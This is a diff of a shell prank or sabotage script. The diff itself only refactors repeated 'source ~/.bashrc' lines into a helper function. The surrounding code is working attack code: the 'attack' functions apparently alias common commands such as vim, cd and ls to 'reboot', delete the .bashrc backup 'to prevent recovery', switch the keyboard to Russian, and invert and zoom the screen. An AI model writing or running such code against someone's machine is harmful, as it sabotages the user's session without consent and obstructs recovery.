@@ -3,6 +3,12 @@ clear
 version='0.1.1'
 default_alias="reboot"
 
+refresh_bash()
+{
+    echo "Refreshing the bashrc"
+    source ~/.bashrc
+}
+
 basic_attack()
 {
     for alias in "emacs" "ne" "vim" "vi" "cd" "ls"
@@ -12,8 +18,7 @@ basic_attack()
     done
     echo "Removing the temporary .bashrc~ file (to prevent recovery)"
     rm -f ~/.bashrc~
-    echo "Refreshing the bashrc"
-    source ~/.bashrc
+    refresh_bash
 }
 
 normal_attack()
@@ -27,8 +32,7 @@ normal_attack()
     rm -f ~/.bashrc~
     echo "Changing the keyboard to Russian"
     setxkbmap ru
-    echo "Refreshing the bashrc"
-    source ~/.bashrc
+    refresh_bash
 }
 
 hardcore_attack()
@@ -46,8 +50,7 @@ hardcore_attack()
     xrandr -o inverted
     echo "Zooming in"
     xrandr --scale 5x5
-    echo "Refreshing the bashrc"
-    source ~/.bashrc
+    refresh_bash
 }
 
 echo "+-------------------------------------------------+"
